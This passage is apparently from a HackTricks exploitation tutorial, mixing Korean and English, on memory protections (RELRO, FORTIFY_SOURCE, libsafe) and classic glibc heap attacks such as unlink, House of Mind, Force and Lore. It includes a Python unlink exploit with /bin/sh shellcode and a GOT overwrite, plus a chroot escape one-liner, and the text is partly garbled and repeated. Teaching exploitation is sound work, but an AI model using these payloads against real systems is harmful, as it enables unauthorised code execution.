0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
바이너리 **relro가 없는** 경우, `fgets`의 `got` 엔트리 주소가 `0x404018`임을 볼 수 있습니다. 메모리 매핑을 살펴보면 `0x404000`과 `0x405000` 사이에 위치하며 **권한이 `rw`**인 것을 알 수 있습니다. 이는 읽고 쓸 수 있다는 것을 의미합니다. **relro가 있는** 바이너리의 경우, 바이너리 실행 중 `got` 테이블 주소 (pie가 활성화되어 있으므로 이 주소는 변경됨)가 `0x555555557fd0`임을 볼 수 있습니다. 이 바이너리의 메모리 매핑에서 이는 `0x0000555555557000`과 `0x0000555555558000` 사이에 위치하며 메모리 **권한이 `r`**인 것을 알 수 있습니다. 따라서 이를 읽기만 할 수 있습니다.

그렇다면 **우회**는 무엇일까요? 저는 일반적으로 relro로 인해 읽기 전용이 되는 메모리 영역에 쓰지 않고, **코드 실행 방법을 찾는 다른 방법을 찾습니다**.

이를 위해 바이너리는 실행 전에 다음과 같은 함수들의 주소를 알아야 합니다:

* Lazy binding: 함수의 주소는 함수가 처음 호출될 때 검색됩니다. 따라서 실행 중에 GOT는 쓰기 권한이 필요합니다.
* Bind now: 함수들의 주소는 실행의 시작에서 해결되고, 그 후 .got, .dtors, .ctors, .dynamic, .jcr과 같은 민감한 섹션에 읽기 전용 권한이 부여됩니다. `` `** ``-z relro`**`y`**`-z now\`\*\*

프로그램이 Bind now를 사용하는지 확인하려면 다음을 수행할 수 있습니다:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Cuando the binary is loaded into memory and a function is called for the first time, it jumps to the PLT (Procedure Linkage Table). From here, a jump (jmp) is made to the GOT and it discovers that this entry has not been resolved (it contains an address following the PLT). Therefore, it invokes the Runtime Linker or rtfd to resolve the address and save it in the GOT.

When a function is called, it calls the PLT, which has the address of the GOT where the function's address is stored, redirecting the flow there to call the function. However, if it is the first time the function is called, what is in the GOT is the next instruction of the PLT, so the flow follows the PLT code (rtfd) and finds out the function's address, saves it in the GOT, and calls it.

When loading a binary into memory, the compiler has instructed where to place data that needs to be loaded when the program is run.

Lazy binding —> The function's address is searched the first time that function is invoked, so the GOT has write permissions so that when it is searched, it is saved there and does not need to be searched again.

Bind now —> The addresses of the functions are searched when the program is loaded, and the permissions of the sections .got, .dtors, .ctors, .dynamic, .jcr are changed to read-only. **-z relro** and **-z now**

Despite this, in general, programs are not complicated with these options, so these attacks remain possible.

**readelf -l /proc/ID\_PROC/exe | grep BIND\_NOW** —> To check if they use BIND NOW

**Fortify Source -D\_FORTIFY\_SOURCE=1 or =2**

It tries to identify functions that copy data from one place to another insecurely and replace the function with a secure one.

For example:\
char buf\[16];\
strcpy(but, source);

It identifies it as insecure and then changes strcpy() to \_\_strcpy\_chk() using the buffer size as the maximum size to copy.

The difference between **=1** or **=2** is that:

The second one does not allow **%n** to come from a section with write permissions. Also, the parameter for direct argument access can only be used if the previous ones are used, meaning **%3$d** can only be used if **%2$d** and **%1$d** have been used before.

To display the error message, argv\[0\] is used, so if the address of another location (like a global variable) is placed there, the error message will display the content of that variable. Page 191

**Libsafe Replacement**

Activated with: LD\_PRELOAD=/lib/libsafe.so.2\
or\
“/lib/libsave.so.2” > /etc/ld.so.preload

It intercepts calls to some insecure functions with secure ones. It is not standardized. (only for x86, not for compilations with -fomit-frame-pointer, not for static compilations, not all vulnerable functions become secure, and LD\_PRELOAD does not work on binaries with suid).

**ASCII Armored Address Space**

It involves loading shared libraries from 0x00000000 to 0x00ffffff to always have a byte 0x00. However, this does not effectively prevent almost any attack, especially in little endian.

**ret2plt**

It involves performing a ROP so that the strcpy@plt function is called (from the plt) and points to the entry in the GOT and copies the first byte of the function to be called (system()). Then the same is done pointing to GOT+1 and copying the 2nd byte of system()... Finally, the address stored in the GOT, which will be system(), is called.

**Fake EBP**

For functions that use EBP as a register to point to arguments, when modifying the EIP and pointing to system(), the EBP must also have been modified to point to a memory area with any 2 bytes and then the address to &”/bin/sh”.

**Chroot Jails**

debootstrap -arch=i386 hardy /home/user —> Installs a basic system under a specific subdirectory

An admin can escape from one of these jails by: mkdir foo; chroot foo; cd ..

**Code Instrumentation**

Valgrind —> Looks for errors\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Basic Exploits**

**Allocated Chunk**

prev\_size |\
size | —Header\
\*mem | Data

**Free Chunk**

prev\_size |\
size |\
\*fd | Ptr forward chunk\
\*bk | Ptr back chunk —Header\
\*mem | Data

Free chunks are in a doubly linked list (bin) and there should never be two free chunks together (they are merged).

In “size”, there are bits to indicate: if the previous chunk is in use, if the chunk was allocated using mmap(), and if the chunk belongs to the primary arena.

When a chunk is freed and any of the contiguous chunks are free, they are merged using the unlink() macro, and the new larger chunk is passed to frontlink() to insert it into the appropriate bin.

unlink(){\
BK = P->bk; —> The BK of the new chunk is the one that the previously free chunk had\
FD = P->fd; —> The FD of the new chunk is the one that the previously free chunk had\
FD->bk = BK; —> The BK of the next chunk points to the new chunk\
BK->fd = FD; —> The FD of the previous chunk points to the new chunk\
}

Therefore, if we manage to modify P->bk with the address of a shellcode and P->fd with the address to an entry in the GOT or DTORS minus 12, it achieves:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

And thus, the shellcode is executed when exiting the program.

Additionally, the 4th statement of unlink() writes something, and the shellcode must be adjusted for this:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) —> This causes the writing of 4 bytes starting from the 8th byte of the shellcode, so the first instruction of the shellcode must be a jmp to skip this and reach some nops that lead to the rest of the shellcode.

Therefore, the exploit is created:

In buffer1, the shellcode is inserted starting with a jmp so that it lands on the nops or the rest of the shellcode.

After the shellcode, padding is added until reaching the prev\_size and size fields of the next chunk. In these places, 0xfffffff0 is inserted (to overwrite the prev\_size to have the bit indicating it is free) and “-4” (0xfffffffc) in the size (so that when checking in the 3rd chunk if the 2nd was free, it actually goes to the modified prev\_size indicating it is free) -> So when free() investigates, it will go to the size of the 3rd chunk but actually go to the 2nd - 4 and think the 2nd chunk is free. Then it calls **unlink()**.

When calling unlink(), it uses the first data of the 2nd chunk as P->fd, so the address to be overwritten - 12 (as in FD->bk it will add 12 to the address stored in FD) will be placed there. And at that address, the second address found in the 2nd chunk will be inserted, which should be the address to the shellcode (fake P->bk).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes of padding**
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #이전 청크가 비어 있다고 표시되는 비트가 1이어야 함**

**fake\_size = pack("\<I”, 0xfffffffc) #-4, 3번째 청크의 "size"가 4바이트 뒤에 있다고 생각하게끔 함 (prev\_size를 가리킴)**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #페이로드의 처음에 8바이트의 패딩을 추가함**

**got\_free = pack("\<I", 0x08048300 - 12) #plt-12에서 free()의 주소 (free가 두 번째 호출될 때 shellcode가 실행되도록 덮어씌워질 주소)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #8바이트의 패딩으로 페이로드 시작**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #두 번째 청크 수정, got\_free는 addr\_sc + 12를 저장할 위치를 가리킴**

**os.system("./8.3.o " + payload)**

**unset() 역순으로 해제 (wargame)**

우리는 3개의 연속적인 청크를 제어하고, 역순으로 해제됩니다.

이 경우:

청크 c에 shellcode를 넣습니다.

청크 a를 사용하여 b를 덮어쓰기하여 청크 a가 비어 있다고 생각하도록 이전 청크의 PREV\_INUSE 비트를 비활성화합니다.

또한, 헤더 b의 size를 -4로 덮어씁니다.

그러면 프로그램은 "a"가 비어 있고 bin에 있는 것으로 생각하여 unlink()를 호출합니다. 그러나 PREV\_SIZE가 -4이므로 "a" 청크가 실제로 b+4에서 시작한다고 생각합니다. 즉, b+4에서 unlink()를 수행하게 되어 b+12에는 "fd" 포인터가 있고 b+16에는 "bk" 포인터가 있습니다.

따라서 bk에는 shellcode 주소를, fd에는 "puts()" 함수 주소-12를 넣으면 페이로드가 완성됩니다.

**Frontlink 기술**

해제되는 것이 주변 청크 중 하나도 비어 있지 않을 때 unlink() 대신에 frontlink()가 호출됩니다.

공격 대상 malloc이 결코 해제되지 않을 때 유용한 취약점입니다.

필요한 것:

데이터 입력 함수로 오버플로우될 수 있는 버퍼

해당 버퍼를 해제하고 입력 버퍼의 헤더의 fd 필드를 수정할 수 있는 인접한 버퍼

512보다 크고 이전 버퍼보다 작은 크기의 해제할 버퍼

이전 단계 3 이전에 선언된 버퍼로 이 버퍼의 prev\_size를 덮어쓸 수 있어야 함

이렇게 함으로써 두 개의 malloc을 무질서하게 덮어쓰고 하나는 제어적으로 해제되지만 그것만 해제되는 상황을 만들어 exploit을 수행할 수 있습니다.

**Double free() 취약점**

동일한 포인터로 두 번 free()를 호출하면 두 개의 bin이 동일한 주소를 가리킵니다.

하나를 다시 사용하려면 문제가 없이 할당됩니다. 다른 것을 사용하려면 이전 예약이 작성한 데이터로 "fd"와 "bk" 포인터가 왜곡됩니다.

**After free()**

이전에 해제된 포인터가 제어 없이 다시 사용됩니다.

## **8 힙 오버플로우: 고급 Exploits**

unlink() 및 FrontLink() 기술은 unlink() 함수를 수정함으로써 제거되었습니다.

**The house of mind**

임의 코드 실행을 유발하기 위해 free()를 한 번 호출하는 것만으로 충분합니다. 이전에 오버플로우된 후 해제될 수 있는 두 번째 청크를 찾는 것이 중요합니다.

free() 호출은 public\_fREe(mem)를 호출하게 되며 다음을 수행합니다:

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> 청크가 시작하는 주소를 가리키는 포인터를 반환합니다 (mem-8)

…

ar\_ptr = arena\_for\_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

\[1]에서 size 필드와 NON\_MAIN\_ARENA 비트를 확인하여 true를 반환하고 heap\_for\_ptr()를 실행할 수 있도록 변경할 수 있습니다. 이 함수는 "mem"에 AND를 수행하여 가장 중요하지 않은 2.5바이트를 0으로 만들고 0x08000000에 액세스하여 0x08000000->ar\_ptr(구조체 heap\_info처럼)에 액세스합니다.

따라서 예를 들어 0x0804a000에 청크를 제어하고 **0x081002a0**에 청크를 해제할 때 0x08100000 주소로 이동하여 원하는 내용을 쓸 수 있습니다. 예를 들어 **0x0804a000**을 쓸 수 있습니다. 두 번째 청크가 해제될 때 heap\_for\_ptr(ptr)->ar\_ptr이 0x08100000에 쓴 내용을 반환할 것입니다 (0x081002a0에 AND가 적용되고 거기서 처음 4바이트의 값, ar\_ptr이 추출됨).

따라서 \_int\_free(ar\_ptr, mem)가 호출됩니다. 즉, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
…\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

앞서 본 대로 av의 값을 제어할 수 있으므로 이를 해제할 청크에 쓸 수 있습니다.

unsorted\_chunks가 정의된 대로 알 수 있습니다:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

따라서 av->bins\[2]에 \_\_DTOR\_END\_\_-12의 값을 쓰면 마지막 명령에서 \_\_DTOR\_END\_\_에 두 번째 청크의 주소가 쓰입니다.

즉, 첫 번째 청크의 시작 부분에 많은 번의 \_\_DTOR\_END\_\_-12 주소를 넣어야 합니다. 왜냐하면 av->bins\[2]에서 이 주소를 가져오기 때문입니다.

두 번째 청크에서 첫 번째 청크의 prev\_size를 jump 0x0c로 덮어쓰고 NON\_MAIN\_ARENA를 활성화하기 위해 size를 덮어씁니다.

그런 다음 두 번째 청크에 많은 nops를 넣고 마지막으로 shellcode를 넣습니다.

이렇게 하면 \_int\_free(TROZO1, TROZO2)가 호출되고 \_\_DTOR\_END\_\_에 TROZO2의 prev\_size 주소가 쓰이며 shellcode로 이동합니다.

이 기술을 적용하려면 페이로드를 조금 더 복잡하게 만드는 몇 가지 요구 사항을 충족해야 합니다.
이 기술은 더 이상 적용되지 않습니다. unlink에 거의 동일한 패치가 적용되었습니다. 새로운 대상이 자신을 가리키고 있는지 비교됩니다.

**Fastbin**

The house of mind의 변형입니다.

다음 코드를 실행하려면 \_int\_free() 함수의 첫 번째 확인 후에 도달해야 합니다.

fb = &(av->fastbins\[fastbin\_index(size)] —> fastbin\_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

이렇게 함으로써 "fb"에 함수의 주소가 들어가며, 이 주소에 덮어쓰기할 조각의 주소가 들어갑니다. 이를 위해서는 아레나가 dtors 주소 근처에 있어야 합니다. 더 정확히 말하면 av->max\_fast가 덮어쓸 주소여야 합니다.

The House of Mind에서 우리가 av의 위치를 제어할 수 있다는 것을 알았기 때문에,

따라서 size 필드에 8 + NON\_MAIN\_ARENA + PREV\_INUSE 크기를 넣으면 fastbin\_index()가 fastbins\[-1\]을 반환하고 이는 av->max\_fast를 가리킵니다.

이 경우 av->max\_fast가 덮어쓰여질 주소가 됩니다(가리키는 것이 아니라 덮어쓰여질 위치가 됩니다).

또한, 해제된 조각 옆에 연속된 조각이 8보다 커야 합니다. 우리는 해제된 조각의 크기가 8이라고 했기 때문에, 이 가짜 조각에는 8보다 큰 크기를 넣어야 합니다(또한 쉘코드가 해제된 조각에 들어갈 것이므로, 가짜 조각의 size 필드 뒤에 나오는 nops로 떨어지는 jmp를 먼저 넣어야 합니다).

또한, 이 가짜 조각은 av->system\_mem보다 작아야 합니다. av->system\_mem은 해당 위치에서 1848바이트 떨어져 있습니다.

\_DTOR\_END\_의 널 값과 GOT의 적은 주소로 인해 이러한 섹션의 어떤 주소도 덮어쓰기에 적합하지 않습니다. 따라서 스택을 공격하기 위해 fastbin을 적용하는 방법을 살펴보겠습니다.

다른 공격 방법은 **av**를 스택으로 리다이렉션하는 것입니다.

size를 8이 아닌 16으로 수정하면 fastbin\_index()가 fastbins\[0\]을 반환하고 이를 사용하여 스택을 덮어쓸 수 있습니다.

이를 위해서는 스택에 canary나 이상한 값이 없어야 하며, 실제로 우리는 여기에 있어야 합니다: 4바이트 널 + EBP + RET

4바이트 널은 **av**가 이 주소에 있어야 하며, **av**의 첫 번째 요소는 0이어야 합니다.

**av->max\_fast**는 EBP가 되며, 이는 우리가 제약 조건을 우회하는 데 사용할 값입니다.

**av->fastbins\[0\]**에는 **p**의 주소가 덮어쓰이며, RET이 됩니다. 따라서 쉘코드로 이동합니다.

또한, **av->system\_mem** (스택 위치에서 1484바이트 위)에는 우리가 수행할 확인을 우회할 수 있는 충분한 쓰레기가 있어야 합니다.

또한, 해제된 조각 옆에 연속된 조각이 8보다 커야 합니다. 해제된 조각의 크기가 16이라고 했기 때문에, 이 가짜 조각에는 8보다 큰 크기를 넣어야 합니다(또한 쉘코드가 해제된 조각에 들어갈 것이므로, 가짜 조각의 size 필드 뒤에 나오는 nops로 떨어지는 jmp를 먼저 넣어야 합니다).

**The House of Spirit**

이 경우에는 공격자가 조작 가능한 malloc 포인터를 가져야 합니다(예: 포인터가 변수 오버플로우 아래 스택에 있는 경우).

따라서 이 포인터가 원하는 곳을 가리킬 수 있도록 만들 수 있습니다. 그러나 모든 위치가 유효한 것은 아닙니다. 가짜 조각의 크기는 av->max\_fast보다 작아야 하며, 미래의 malloc() 호출에 요청된 크기에 8을 더한 것과 정확히 같아야 합니다. 따라서, 이 취약한 코드에 도달하려면 메모리 요청이 av->max\_fast(보통 72)보다 크고 MIN\_LARGE\_SIZE(512)보다 작아야 합니다.

예를 들어, 프로그램이 사용자에게 숫자를 물으면 48을 입력하고 malloc 포인터를 수정 가능한 다음 4바이트로 이동시킬 수 있습니다(운이 좋다면 EBP일 수 있으므로, 48이 뒤에 남게 됩니다. 이외에도 ptr-4+48 주소는 여러 조건을 충족해야 합니다(이 경우 ptr=EBP), 즉, 8 < ptr-4+48 < av->system\_mem.

이 조건이 충족되면, 우리가 말한 malloc(40) 호출 시 EBP의 주소가 할당됩니다. 공격자가 이 malloc에 쓸 내용을 제어할 수 있다면 EBP와 EIP를 원하는 주소로 덮어쓸 수 있습니다.

이것은 free()가 스택의 EBP를 가리키는 주소에 새로운 malloc()에 완벽한 크기의 조각이 있다는 것을 저장하기 때문이라고 생각합니다. 따라서 그 주소를 할당합니다.

**The House of Force**

필요한 것:

* wilderness를 덮어쓸 수 있는 조각의 오버플로우
* 사용자가 정의한 크기로 malloc() 호출
* 사용자가 정의한 데이터로 malloc() 호출

첫 번째로 wilderness 조각의 크기를 매우 큰 값(0xffffffff)으로 덮어쓰기하여 메모리 요청이 힙을 확장할 필요 없이 \_int\_malloc()에서 처리되도록 합니다.

두 번째로, av->top을 공격자가 제어하는 메모리 영역(예: 스택)을 가리키도록 변경합니다. av->top에는 \&EIP - 8이 들어갑니다.

공격자가 제어하는 메모리 영역을 가리키도록 av->top을 덮어써야 합니다:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim은 현재 wilderness 조각의 주소(현재 av->top)를 수집하고, remainder는 해당 주소와 malloc()에 의해 요청된 바이트 수를 더한 것입니다. 따라서, \&EIP-8이 0xbffff224에 있고 av->top에 0x080c2788이 포함되어 있다면, 다음 malloc()에 av->top이 \&EIP-8을 가리키도록 제어된 malloc에 예약해야 하는 바이트 수는 다음과 같습니다:

0xbffff224 - 0x080c2788 = 3086207644.

따라서 변경된 값을 av->top에 저장하고 다음 malloc이 EIP를 가리키고 덮어쓸 수 있습니다.

새로운 wilderness 조각의 크기가 마지막 malloc() 호출에 의해 요청된 크기보다 커야 합니다. 즉, wilderness가 \&EIP-8을 가리키고 있다면, 크기는 정확히 스택의 EBP 필드에 위치합니다.

**The House of Lore**

**SmallBin 손상**

해제된 조각은 크기에 따라 bin에 넣습니다. 그러나 bin에 넣기 전에 unsorted bins에 보관됩니다. 조각이 해제되면 즉시 해당 bin에 넣지 않고 unsorted bins에 남아 있습니다. 그런 다음 새로운 조각을 예약하고 이전에 해제된 조각을 사용할 수 있는 경우 해당 조각을 반환하지만, 더 큰 조각을 예약하면 unsorted bins에 있는 조각이 해당하는 적절한 bin에 넣습니다.

취약한 코드에 도달하려면 메모리 요청이 av->max\_fast(보통 72)보다 크고 MIN\_LARGE\_SIZE(512)보다 작아야 합니다.

bin에 적절한 크기의 조각이 있는 경우 해당 조각을 반환하고 다음과 같이 해제합니다:

bck = victim->bk; 이전 조각을 가리킵니다. 우리가 변경할 수 있는 유일한 정보입니다.

bin->bk = bck; 뒤에서 두 번째 조각이 마지막이 되며, bck가 스택을 가리키는 경우 다음 예약된 조각에 이 주소가 할당됩니다.

bck->fd = bin; 이를 bin으로 가리키도록하여 목록을 닫습니다.

필요한 것:
두 개의 malloc이 예약되어야 합니다. 두 번째 malloc이 해제되고 해당 bin에 들어간 후에 첫 번째 malloc에 오버플로우를 발생시킬 수 있어야 합니다 (즉, 오버플로우하기 전에 두 번째 조각보다 큰 malloc이 예약되어야 함).

공격자가 선택한 주소를 가리키는 malloc이 공격자에 의해 제어되어야 합니다.

목표는 다음과 같습니다. 이미 해제되어 bin에 있는 하위 조각에 오버플로우를 발생시킬 수 있다면, 해당 조각의 bk 포인터를 수정할 수 있습니다. bk 포인터를 수정하고 해당 조각이 bin 목록의 첫 번째로 되어 다시 예약되면, bin을 속일 수 있고 다음으로 제공될 목록의 마지막 조각이 우리가 설정한 가짜 주소에 있다고 알립니다 (예: 스택 또는 GOT). 따라서 다른 조각이 다시 예약되고 공격자가 해당 조각에 권한이 있다면, 원하는 위치에 조각이 제공되고 해당 위치에 쓸 수 있습니다.

수정된 조각을 해제한 후 해제된 조각보다 큰 조각을 예약해야 합니다. 이렇게 하면 수정된 조각이 unsorted bins에서 나오고 해당 bin에 들어갈 것입니다.

한 번 bin에 들어가면 오버플로우를 통해 bk 포인터를 수정해야 합니다. 이제 bin은 malloc()이 호출될 때 충분히 많이 호출되어 수정된 bin이 다시 사용되고 다음 조각이 가짜 주소에 있는 것처럼 bin을 속이게 해야 합니다. 그런 다음 원하는 조각이 제공됩니다.

취약성이 가능한 한 빨리 실행되도록하려면 다음이 이상적입니다. 취약한 조각 예약, 수정될 조각 예약, 해당 조각 해제, 수정될 조각보다 큰 조각 예약, 조각 수정 (취약성), 수정된 조각과 동일한 크기의 조각 예약, 그리고 수정된 조각과 동일한 크기의 두 번째 조각 예약하고 이것이 선택한 주소를 가리키게 합니다.

이 공격을 방어하기 위해 "가짜" 조각이 아닌 것을 확인하는 전형적인 확인이 사용되었습니다: bck->fd가 victim을 가리키는지 확인합니다. 즉, 우리의 경우 스택에 가짜 조각이 가리키는 fd\* 포인터가 victim을 가리키는지 확인합니다. 이 보호를 우회하려면 공격자는 어떤 방식으로든 (아마도 스택을 통해) 적절한 주소에 victim의 주소를 쓸 수 있어야 합니다. 그렇게 하면 진짜 조각처럼 보일 것입니다.

**LargeBin 손상**

이전과 동일한 요구 사항과 추가 요구 사항이 필요하며, 예약된 조각은 512보다 큰 크기여야 합니다.

공격은 이전과 같이 bk 포인터를 수정해야 하며, 모든 그 malloc() 호출이 필요하지만 수정된 조각의 크기를 수정해야 합니다. 즉, 그 크기 - nb가 < MINSIZE여야 합니다.

예를 들어, 크기를 1552로 설정하여 1552 - 1544 = 8 < MINSIZE가 되도록합니다 (부호 없는 것을 비교하므로 차이가 음수가 되어서는 안됩니다).

또한 더 복잡하게 만들기 위해 패치가 도입되었습니다.

**힙 스프레이**

기본적으로 가능한 한 많은 힙 메모리를 예약하고 이를 모두 nops로 끝나는 셸코드로 채웁니다. 또한 0x0c를 셜코드로 사용합니다. 따라서 0x0c0c0c0c 주소로 점프하려고 시도하며, 따라서이 셜코드로 호출될 주소가 덮어쓰여지면 해당 위치로 점프합니다. 기본적으로 전략은 가능한 한 많이 예약하여 어떤 포인터가 덮어쓰이는지 확인하고 0x0c0c0c0c로 점프하여 그곳에 nops가 있는지 확인하는 것입니다.

**힙 펑 수이**

힙을 예약하고 해제하여 빈 힙 사이에 예약된 조각이 남도록 메모리를 정돈하는 것입니다. 오버플로우 할 버퍼는 이러한 빈 공간 중 하나에 위치합니다.

## 흥미로운 코스

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **참고 자료**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)로부터 제로에서 영웅까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구입하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [디스코드 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 가입하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **HackTricks** 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) github 저장소에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>
